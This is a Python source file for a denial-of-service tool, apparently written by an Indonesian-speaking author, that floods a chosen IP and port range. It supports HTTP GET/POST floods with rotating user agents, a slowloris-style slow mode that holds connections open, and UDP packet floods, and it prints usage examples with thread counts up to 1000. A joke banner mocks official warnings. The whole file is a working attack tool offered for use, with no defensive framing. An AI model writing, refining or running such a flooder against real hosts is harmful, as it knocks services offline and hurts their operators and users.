import socket
import threading
import random
import sys
import time
import logging
import selectors
import queue
from colorama import init, Fore

# --- Inisialisasi ---
init()
LOG_FILENAME = 'attack_log.txt'
logging.basicConfig(filename=LOG_FILENAME, level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# --- Banner ---
BANNER = Fore.CYAN + r"""
░█░█░█▀█░▄▀▄░░░█▀▀░█░░░█▀█░█▀█░█▀▄░█▀▀░█▀▄
░█▀█░█▀█░█\█░░░█▀▀░█░░░█░█░█░█░█░█░█▀▀░█▀▄
░▀░▀░▀░▀░░▀\░░░▀░░░▀▀▀░▀▀▀░▀▀▀░▀▀░░▀▀▀░▀░▀                                   
"""

# --- User Agents ---
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; HMD Global Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
]

# --- Helper Functions (tetap global karena tidak terkait langsung dengan state attack) ---
def get_random_user_agent():
    return random.choice(USER_AGENTS)

def generate_random_string(length=100):
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(characters) for _ in range(length))

def parse_http_status(response_data):
    if not response_data: return None, "No Response Data"
    try:
        response_str = response_data.decode('utf-8', errors='ignore')
        if "HTTP/" in response_str:
            status_line = response_str.split('\r\n')[0]
            parts = status_line.split(' ')
            if len(parts) >= 2: return parts[1], status_line
        return None, "Non-HTTP Response"
    except Exception: return None, "Error Parsing Response"

# --- Attack Manager Class ---
class AttackManager:
    def __init__(self, target_ip, ports_to_attack, threads_per_port, attack_type, mode, duration_sec, http_method='GET'):
        self.target_ip = target_ip
        self.ports_to_attack = ports_to_attack
        self.threads_per_port = threads_per_port
        self.attack_type = attack_type.lower()
        self.mode = mode.lower()
        self.duration_sec = duration_sec
        self.http_method = http_method.upper()

        # State sebagai atribut instance
        self.sent_requests_total = 0
        self.active_connections = 0
        self.error_count = 0
        self.server_errors = 0
        self.stop_event = threading.Event()
        self.attack_threads = []
        self.lock = threading.Lock()
        
        # Konfigurasi jumlah soket per thread, disesuaikan dengan mode
        self.num_sockets_per_thread = 10 if self.mode == 'slow' else 50

        if self.attack_type == 'http' and self.mode == 'slow' and self.http_method == 'POST':
            print(f"{Fore.YELLOW}Warning: POST method in 'slow' mode might be less effective or behave unexpectedly.{Fore.RESET}")
        
        logging.info(f"Initializing AttackManager for {self.target_ip}:{self.ports_to_attack} ({self.attack_type}/{self.mode}) with {self.threads_per_port} threads/port. Duration: {'Unlimited' if self.duration_sec is None else f'{self.duration_sec}s'}. HTTP Method: {self.http_method}")

    # --- Helper Methods ---
    def _get_random_user_agent(self):
        return get_random_user_agent() # Memanggil global helper

    def _generate_random_string(self, length=100):
        return generate_random_string(length) # Memanggil global helper

    def _generate_http_request(self, target, method, mode):
        random_path = f"/?{self._generate_random_string(10)}"
        headers = [
            f"{method.upper()} {random_path} HTTP/1.1",
            f"Host: {target}",
            f"User-Agent: {self._get_random_user_agent()}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Connection: keep-alive",
            "Upgrade-Insecure-Requests: 1",
        ]

        body_data = b""
        if method.upper() == 'POST':
            post_payload_str = f"user={self._generate_random_string(20)}&pass={self._generate_random_string(20)}&data={self._generate_random_string(50)}"
            body_data = post_payload_str.encode('utf-8', errors='ignore')
            headers.append(f"Content-Type: application/x-www-form-urlencoded")
            headers.append(f"Content-Length: {len(body_data)}")
        
        if mode == 'slow':
            headers = [
                f"{method.upper()} {random_path} HTTP/1.1",
                f"Host: {target}",
                f"User-Agent: {self._get_random_user_agent()}",
                "Accept: */*",
                "Accept-Encoding: identity",
                "Connection: keep-alive",
            ]
            if method.upper() == 'POST':
                post_payload_str = f"data={self._generate_random_string(10)}"
                body_data = post_payload_str.encode('utf-8', errors='ignore')
                headers.append(f"Content-Type: application/x-www-form-urlencoded")
                headers.append(f"Content-Length: {len(body_data)}")

        headers.append("")
        request = "\r\n".join(headers)
        if body_data:
            request += "\r\n" + body_data.decode('utf-8', errors='ignore')
        return request

    def _generate_udp_packet(self):
        payload = b"".join(random.choice(b"abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(random.randint(500, 1000)))
        return payload

    # --- Thread Methods ---
    def _open_connection(self, sel, port, num_sockets_limit):
        sock = None
        try:
            if self.active_connections >= num_sockets_limit:
                return

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setblocking(False)
            sock.settimeout(5)
            sock.connect((self.target_ip, port))
            
            sel.register(sock, selectors.EVENT_WRITE, data={'method': self.http_method, 'mode': self.mode, 'request_sent': False})
            
            with self.lock:
                self.active_connections += 1
                logging.info(f"New connection opened to {self.target_ip}:{port}. Active: {self.active_connections}/{num_sockets_limit}")
                
        except (socket.gaierror, socket.timeout, ConnectionRefusedError, OSError) as e:
            with self.lock:
                self.error_count += 1
            logging.warning(f"Failed to open connection to {self.target_ip}:{port}: {e}")
            if sock: sock.close()
        except Exception as e:
            with self.lock:
                self.error_count += 1
            logging.error(f"Unexpected error opening connection to {self.target_ip}:{port}: {e}")
            if sock: sock.close()

    def _close_connection(self, sel, sock, port):
        try:
            sel.unregister(sock)
            sock.close()
            with self.lock:
                self.active_connections -= 1
                logging.info(f"Connection closed to {self.target_ip}:{port}. Active: {self.active_connections}")
        except Exception as e:
            logging.error(f"Error closing connection to {self.target_ip}:{port}: {e}")

    def _http_attack_thread(self, port):
        request_queue = queue.Queue()
        for _ in range(self.num_sockets_per_thread * 2):
            request_queue.put(self._generate_http_request(self.target_ip, self.http_method, self.mode))

        sel = selectors.DefaultSelector()
        start_time = time.time()
        
        # Buka koneksi awal
        for _ in range(self.num_sockets_per_thread):
            self._open_connection(sel, port, self.num_sockets_per_thread)

        idle_loops = 0
        while not self.stop_event.is_set():
            
            # Periksa durasi serangan
            if self.duration_sec is not None and (time.time() - start_time) > self.duration_sec:
                logging.info(f"Attack duration reached for {self.target_ip}:{port}. Stopping thread.")
                break 

            # Coba buka koneksi baru jika masih di bawah batas
            if self.active_connections < self.num_sockets_per_thread:
                self._open_connection(sel, port, self.num_sockets_per_thread)
            
            events = sel.select(timeout=1.0)
            
            if not events and self.active_connections == 0:
                idle_loops += 1
                if idle_loops > 10: # Jika diam terlalu lama
                    logging.warning(f"No active connections or events for {self.target_ip}:{port}. Exiting thread.")
                    break
                continue
            else:
                idle_loops = 0 # Reset jika ada aktivitas

            for key, mask in events:
                sock = key.fileobj
                data = key.data

                # --- Event WRITE ---
                if mask & selectors.EVENT_WRITE:
                    try:
                        if not data['request_sent']:
                            request_str = request_queue.get_nowait()
                            request_bytes = request_str.encode('utf-8', errors='ignore')
                            
                            sock.sendall(request_bytes)
                            
                            with self.lock:
                                self.sent_requests_total += 1
                            
                            data['request_sent'] = True
                            
                            if data['mode'] == 'slow': # Kirim data tambahan untuk mode slow
                                slow_data = f"\r\nKeep-Alive: {self._generate_random_string(10)}"
                                sock.sendall(slow_data.encode('utf-8', errors='ignore'))
                            
                            sel.modify(sock, selectors.EVENT_READ, data=data) # Siap membaca respons
                            
                        else: # Permintaan utama sudah terkirim
                            if data['mode'] == 'slow': # Terus kirim data kecil di mode slow
                                try:
                                    slow_data = f"\r\nX-Ignore: {self._generate_random_string(15)}"
                                    sock.sendall(slow_data.encode('utf-8', errors='ignore'))
                                except OSError as e:
                                    logging.warning(f"Error sending slow data to {self.target_ip}:{port}: {e}")
                                    self._close_connection(sel, sock, port)
                                
                    except (OSError, socket.timeout) as e:
                        logging.warning(f"Write error for {self.target_ip}:{port}: {e}")
                        self._close_connection(sel, sock, port)
                    except Exception as e:
                        logging.error(f"Unexpected error during write event for {self.target_ip}:{port}: {e}")
                        self._close_connection(sel, sock, port)

                # --- Event READ ---
                if mask & selectors.EVENT_READ:
                    try:
                        response_chunk = sock.recv(1024)
                        if response_chunk:
                            status_code, _ = parse_http_status(response_chunk)
                            
                            if status_code and (status_code.startswith('4') or status_code.startswith('5')): # Server Error
                                with self.lock:
                                    self.server_errors += 1
                                logging.warning(f"Server Error ({status_code}) from {self.target_ip}:{port}.")
                            
                            if data['mode'] == 'normal': # Mode normal: tutup setelah baca
                               self._close_connection(sel, sock, port)
                            # Mode 'slow': biarkan terbuka, nanti akan kembali ke EVENT_WRITE
                            
                        else: # Koneksi ditutup oleh server
                            logging.info(f"Server closed connection {self.target_ip}:{port}.")
                            self._close_connection(sel, sock, port)
                            
                    except (socket.timeout, OSError) as e:
                        logging.warning(f"Read error for {self.target_ip}:{port}: {e}. Closing connection.")
                        self._close_connection(sel, sock, port)
                    except Exception as e:
                        logging.error(f"Unexpected error during read event for {self.target_ip}:{port}: {e}")
                        self._close_connection(sel, sock, port)

            time.sleep(0.001) # Jeda kecil agar tidak membebani CPU

        # Tutup semua soket yang tersisa saat thread selesai
        for sock in list(sel.get_map().keys()):
            self._close_connection(sel, sock, port)
        sel.close()
        logging.info(f"HTTP attack thread for {self.target_ip}:{port} finished.")

    def _udp_attack_thread(self, port):
        start_time = time.time()
        while not self.stop_event.is_set():
            
            # Periksa durasi serangan
            if self.duration_sec is not None and (time.time() - start_time) > self.duration_sec:
                logging.info(f"Attack duration reached for {self.target_ip}:{port}. Stopping UDP thread.")
                break
                
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(2)

                udp_payload = self._generate_udp_packet()
                s.sendto(udp_payload, (self.target_ip, port))
                
                with self.lock:
                    self.sent_requests_total += 1
                
            except socket.gaierror:
                with self.lock:
                    self.error_count += 1
                logging.warning(f"Socket GAIErr - {self.target_ip}:{port}")
                break
            except socket.timeout:
                with self.lock:
                    self.error_count += 1
            except OSError as e:
                with self.lock:
                    self.error_count += 1
                logging.warning(f"Socket OSError on {self.target_ip}:{port}: {e}")
            except Exception as e:
                with self.lock:
                    self.error_count += 1
                logging.error(f"Unexpected error in UDP thread for {self.target_ip}:{port}: {e}")
            finally:
                if s:
                    s.close()
            
            time.sleep(random.uniform(0.001, 0.005))
        logging.info(f"UDP attack thread for {self.target_ip}:{port} finished.")

    # --- Statistik Display Thread ---
    def _stats_display(self):
        while not self.stop_event.is_set():
            with self.lock:
                current_sent = self.sent_requests_total
                current_errors = self.error_count
                current_active = self.active_connections
                current_srv_err = self.server_errors
            
            progress_bar = (
                f"[{Fore.CYAN}STATS{Fore.RESET}] Target: {Fore.CYAN}{self.target_ip}{Fore.RESET} | "
                f"Sent: {Fore.GREEN}{current_sent}{Fore.RESET} | "
                f"Active Con: {Fore.BLUE}{current_active}{Fore.RESET} | "
                f"Srv Err: {Fore.YELLOW}{current_srv_err}{Fore.RESET} | "
                f"Errors: {Fore.RED}{current_errors}{Fore.RESET} | "
                f"Log: {LOG_FILENAME}"
            )
            sys.stdout.write('\r' + progress_bar + ' ' * 10)
            sys.stdout.flush()
            
            time.sleep(1)
        sys.stdout.write('\n')
        sys.stdout.flush()

    # --- Main Control Methods ---
    def start(self):
        print(BANNER)
        print(f"{Fore.YELLOW}!!! PERINGATAN PEMERINTAH !!!{Fore.RESET}")
        print(f"{Fore.YELLOW}MEROKOK DAPAT MENYEBABKAN KANKER, SERANGAN JANTUNG{Fore.RESET}")
        print(f"{Fore.YELLOW}IMPOTENSI, GANGGUAN KEHAMILAN DAN JANIN{Fore.RESET}")
        print(f"{Fore.YELLOW}TAPI GA USAH DENGAR APA KATA PEMERINTAH{Fore.RESET}")
        print(f"{Fore.RED}Tekan CTRL+C dalam 5 detik untuk membatalkan...{Fore.RESET}")
        
        try:
            time.sleep(5)
            
            print(f"\n{Fore.GREEN}Starting {self.attack_type.upper()} ({self.mode.upper()}) attack on {self.target_ip} on ports {self.ports_to_attack} with {self.threads_per_port} threads/port (Method: {self.http_method}). Duration: {'Unlimited' if self.duration_sec is None else f'{self.duration_sec}s'}...{Fore.RESET}")
            
            # Start statistics display thread
            stats_thread = threading.Thread(target=self._stats_display, daemon=True)
            stats_thread.start()

            # Start attack threads
            for port in self.ports_to_attack:
                for _ in range(self.threads_per_port):
                    if self.attack_type == 'http':
                        thread = threading.Thread(target=self._http_attack_thread, args=(port,))
                    elif self.attack_type == 'udp':
                        thread = threading.Thread(target=self._udp_attack_thread, args=(port,))
                    else:
                        raise ValueError(f"Unsupported attack type: {self.attack_type}")
                        
                    thread.daemon = True
                    self.attack_threads.append(thread)
                    thread.start()
            
            # Main loop to handle duration or wait for manual stop
            if self.duration_sec is not None:
                attack_start_time = time.time()
                while time.time() - attack_start_time < self.duration_sec:
                    if self.stop_event.is_set(): 
                        break
                    time.sleep(1)
                
                print(f"\n{Fore.YELLOW}Attack duration ({self.duration_sec}s) reached. Stopping attack...{Fore.RESET}")
                self.stop_event.set()
            else:
                # Unlimited duration: wait for manual stop (Ctrl+C)
                while not self.stop_event.is_set():
                    time.sleep(1)

        except KeyboardInterrupt:
            print("\nAttack stopped by user. Exiting...")
            self.stop_event.set() # Signal all threads to stop
        except Exception as e:
            print(f"\nAn unexpected error occurred in the main thread: {e}")
            self.stop_event.set()
            logging.critical(f"Main thread error: {e}")
        finally:
            # Cleanup
            logging.info("Starting cleanup process.")
            stats_thread.join(timeout=1.5) # Wait for stats thread to finish
            
            # Wait for attack threads to finish
            for t in self.attack_threads:
                t.join(timeout=0.5) 
            logging.info("All attack threads joined.")

# --- Main Execution ---
if __name__ == "__main__":
    if len(sys.argv) < 7: 
        print(f"\nUsage: python3 {sys.argv[0]} <TARGET_IP> <PORT> <THREADS_PER_PORT> <ATTACK_TYPE> <MODE> <DURATION_SEC> [HTTP_METHOD]")
        print("DURATION_SEC: Attack duration in seconds (e.g., 60 for 1 minute, 0 for unlimited)")
        print("ATTACK_TYPE: 'http' or 'udp'")
        print("MODE: 'normal' (fast flood) or 'slow' (slowloris-like)")
        print("HTTP_METHOD (optional for 'http' type): 'GET' (default) or 'POST'")
        print("\nExample:")
        print(f"  HTTP Normal GET (60s):  python3 {sys.argv[0]} 192.168.1.100 80 500 http normal 60 GET")
        print(f"  HTTP Slow POST (120s):  python3 {sys.argv[0]} 192.168.1.100 8080 200 http slow 120 POST")
        print(f"  UDP Flood (30s):        python3 {sys.argv[0]} 192.168.1.100 53 1000 udp 30")
        print(f"  Unlimited UDP:          python3 {sys.argv[0]} 192.168.1.100 53 1000 udp 0")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    port_arg = sys.argv[2]
    attack_type = sys.argv[4]
    mode = sys.argv[5]
    http_method = 'GET'

    # Parsing Durasi
    try:
        attack_duration = int(sys.argv[6])
        if attack_duration < 0: raise ValueError("DURATION_SEC cannot be negative.")
        if attack_duration == 0: attack_duration = None # 0 means unlimited
    except ValueError as e:
        print(f"Error parsing duration: {e}")
        sys.exit(1)

    # Validasi HTTP Method
    if attack_type.lower() == 'http':
        if len(sys.argv) > 7:
            http_method = sys.argv[7].upper()
            if http_method not in ['GET', 'POST']:
                print(f"Error: Invalid HTTP method '{http_method}'. Use 'GET' or 'POST'.")
                sys.exit(1)

    # Parsing Port
    ports_to_attack = []
    if '-' in port_arg:
        try:
            start_port, end_port = map(int, port_arg.split('-'))
            if not (1 <= start_port <= 65535 and 1 <= end_port <= 65535 and start_port <= end_port):
                raise ValueError("Invalid port range.")
            ports_to_attack = list(range(start_port, end_port + 1))
        except ValueError as e:
            print(f"Error parsing port range '{port_arg}': {e}")
            sys.exit(1)
    else:
        try:
            single_port = int(port_arg)
            if not (1 <= single_port <= 65535):
                raise ValueError("PORT must be between 1 and 65535.")
            ports_to_attack.append(single_port)
        except ValueError as e:
            print(f"Error: {e}")
            sys.exit(1)
    
    # Validasi argumen lainnya
    try:
        threads_per_port = int(sys.argv[3])
        if threads_per_port <= 0: raise ValueError("THREADS must be a positive integer.")
        if attack_type.lower() not in ['http', 'udp']: raise ValueError("ATTACK_TYPE must be 'http' or 'udp'.")
    except ValueError as e:
        print(f"Error: {e}")
        sys.exit(1)

    if not ports_to_attack:
        print("Error: No valid ports specified.")
        sys.exit(1)

    # Buat instance AttackManager
    manager = AttackManager(target_ip, ports_to_attack, threads_per_port, attack_type, mode, attack_duration, http_method)
    
    # Jalankan serangan
    try:
        manager.start()
    except KeyboardInterrupt:
        print("\nAttack interrupted by user. Stopping...")
        manager.stop_attack()
    except Exception as e:
        print(f"\nAn unexpected error occurred during attack execution: {e}")
        manager.stop_attack() # Coba hentikan jika ada error lain
        logging.critical(f"Attack execution error: {e}")

    logging.info("Program finished.")
